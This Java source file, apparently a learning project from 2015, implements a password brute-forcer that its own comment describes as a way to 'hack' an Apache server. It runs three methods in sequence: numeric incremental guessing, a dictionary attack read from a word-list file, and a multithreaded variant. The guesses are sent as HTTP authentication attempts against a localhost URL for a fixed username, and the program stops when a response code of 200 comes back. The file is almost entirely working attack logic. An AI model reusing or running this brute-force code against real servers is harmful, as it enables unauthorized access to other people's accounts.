package Brute;

import java.io.FileNotFoundException;
import java.util.ArrayList;

/**
 * Created by Michael on 06.10.2015.
 * Description: we can hack apache server by 3 ways:
 *          - by simple search
 *          - from files (most popular passwords)
 *          - using a lot of threads
 */
public class Main {
    public static void main(String[] args) throws FileNotFoundException{
        long start = System.currentTimeMillis();

//      3 ways to brute

        SimpleBrute();

        DictBrute();

        ThreadBrute();

        long finish = System.currentTimeMillis();
        long result = finish - start;

//        result time of brute

        System.out.println("Bruteforce time is: " + result);

    }

    public static void DictBrute() throws FileNotFoundException{
        FileWorker dict = new FileWorker();

        ClientAuthentication clientAuthentication = new ClientAuthentication();

        String file = "dict_low.txt";
        ArrayList<String> pass = dict.read(file);

        for (String password: pass)
        {
            if (clientAuthentication.Authenticate("http://127.0.0.1:80//AAA", "useraaa", password, "out/index.txt") == 200)
            {
                System.out.println("Password Found: " + password);
                break;
            } else {
                System.out.println("Password test: " + password);
            }
        }
    }

    public static void SimpleBrute() {
        char[] charset = "1234567890".toCharArray();
        BruteForce bf = new BruteForce(charset, 1);

        ClientAuthentication clientAuthentication = new ClientAuthentication();
        String pass = bf.toString(); // pass value
        while (true)
        {
            if (clientAuthentication.Authenticate("http://127.0.0.1:80//AAA", "useraaa", pass, "out/index.txt") == 200)
            {
                System.out.println("Password Found: " + pass);
                break;
            } else {
                System.out.println("Pass test: " + pass);
            }
            // -- Char BruteForce --
            pass = bf.toString();
            bf.increment();
        }
    }

    public static void ThreadBrute() {
        int limit = 5;
        int index = 1;
        String[] value = {"1", "2", "3", "4", "5"};

        for (int i = 1; i <= limit; i++) {
            new Thread(new ThreadsBrute(value, index)).start();
            index++;
        }
    }
}
